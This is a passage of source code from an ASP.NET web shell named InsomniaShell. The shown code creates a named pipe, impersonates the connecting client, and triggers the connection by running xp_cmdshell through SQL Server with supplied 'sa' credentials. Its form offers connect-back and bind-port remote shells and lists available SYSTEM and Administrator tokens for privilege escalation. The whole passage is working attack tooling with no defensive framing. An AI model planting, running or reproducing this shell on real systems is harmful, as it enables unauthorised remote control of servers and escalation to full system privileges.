        Response.Output.Write("+ Creating Named Pipe: {0}<br>", pipeName);

        hPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_WAIT, 2, 0, 0, 0, secAttr);

        // Check value
        if (hPipe.ToInt32() == INVALID_HANDLE_VALUE)
        {
            Response.Write("- Failed to create named pipe:");
            Response.End();
        }

        Response.Output.Write("+ Created Named Pipe: {0}<br>", pipeName);

        // wait for client to connect   
        Response.Write("+ Waiting for connection...<br>");

        ConnectNamedPipe(hPipe, 0);

        // Get connected user info
        StringBuilder userName = new StringBuilder(256);

        if (!GetNamedPipeHandleState(hPipe, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, userName, userName.Capacity))
        {
            Response.Write("- Error Getting User Info<br>");
            Response.End();
        }
        Response.Output.Write("+ Connection From Client: {0}<br>", userName);

        // assume the identity of the client //
        Response.Write("+ Impersonating client...<br>");
        if (!ImpersonateNamedPipeClient(hPipe))
        {
            Response.Write("- Failed to impersonate the named pipe.<br>");
            CloseHandle(hPipe);
            Response.End();
        }
      

        CloseHandle(hPipe);

        
    }

    protected void butSQLRequest_Click(object sender, EventArgs e)
    {

        String pipeName = "\\\\.\\pipe\\" + txtPipeName.Text;
        String command = "exec master..xp_cmdshell 'dir > \\\\127.0.0.1\\pipe\\" + txtPipeName.Text + "'";

        // Make a local sql request to the pipe
        
        String connectionString = "server=127.0.0.1;database=master;uid=" + txtSQLUser.Text + ";password=" + txtSQLPass.Text;
        
        // create a new SqlConnection object with the appropriate connection string 
        SqlConnection sqlConn = new SqlConnection(connectionString);

        Response.Output.Write("+ Sending {0}<br>", command);
        // open the connection 
        sqlConn.Open();

        // do some operations ...
        // create the command object 
        SqlCommand sqlComm = new SqlCommand(command, sqlConn);
        sqlComm.ExecuteNonQuery();
        // close the connection
        sqlConn.Close();
    }
  
</script>

<html>

<head runat="server">
    <title>InsomniaShell</title>
</head>
<body>
    <form id="form1" runat="server">
    <div>
    <asp:Label ID="Label10" runat="server" Height="26px" Text="InsomniaShell" Width="278px" Font-Bold="True"></asp:Label><br />
    <asp:Label ID="Label5" runat="server" Height="26px" Text="Current Context" Width="278px" Font-Bold="True"></asp:Label><br />
        <%        DisplayCurrentContext();%>
        <br />
        <asp:Label ID="Label1" runat="server" Height="26px" Text="Select Your Shell" Width="278px" Font-Bold="True"></asp:Label><br />
        <br />
        <asp:Label ID="Label2" runat="server" Text="Host" Width="198px"></asp:Label>
        <asp:Label ID="Label3" runat="server" Text="Port" Width="101px"></asp:Label><br />
        <asp:TextBox ID="txtRemoteHost" runat="server" Width="191px"></asp:TextBox>
        <asp:TextBox ID="txtRemotePort" runat="server" Width="94px"></asp:TextBox><br />
        <asp:Button ID="butConnectBack" runat="server" OnClick="butConnectBack_Click" Text="Connect Back Shell"
            Width="302px" /><br />
        <br />
        <asp:Label ID="Port" runat="server" Text="Port" Width="189px"></asp:Label><br />
        <asp:TextBox ID="txtBindPort" runat="server" Width="91px"></asp:TextBox><br />
        <asp:Button ID="butBindPort" runat="server" OnClick="butBindPort_Click" Text="Bind Port Shell"
            Width="299px" /><br />
        <br />
        
        <asp:Label ID="Label7" runat="server" Height="26px" Text="Named Pipe Attack" Width="278px" Font-Bold="True"></asp:Label><br />
        <br />
        <asp:Label ID="Label6" runat="server" Text="Pipe Name" Width="198px"></asp:Label><br />
        <asp:TextBox ID="txtPipeName" runat="server" Text="InsomniaShell" Width="191px"></asp:TextBox><br />
        <asp:Button ID="Button1" runat="server" OnClick="butCreateNamedPipe_Click" Text="Create Named Pipe" Width="400px" /><br />
        <asp:Label ID="Label8" runat="server" Text="SQL User" Width="198px"></asp:Label>
        <asp:Label ID="Label9" runat="server" Text="SQL Pass" Width="101px"></asp:Label><br />
        <asp:TextBox ID="txtSQLUser" runat="server" Width="191px">sa</asp:TextBox>
        <asp:TextBox ID="txtSQLPass" runat="server" Width="94px"></asp:TextBox><br />
        <asp:Button ID="Button3" runat="server" OnClick="butSQLRequest_Click" Text="Make SQL Request" Width="400px" /><br />
        <br />            
        
        <asp:Label ID="Label4" runat="server" Height="26px" Text="Available SYSTEM/Administrator Tokens" Width="400px" Font-Bold="True"></asp:Label><br />
        <br />
        <%   DisplayAvailableTokens(); %>
        
        </div>
    </form>
</body>
</html>
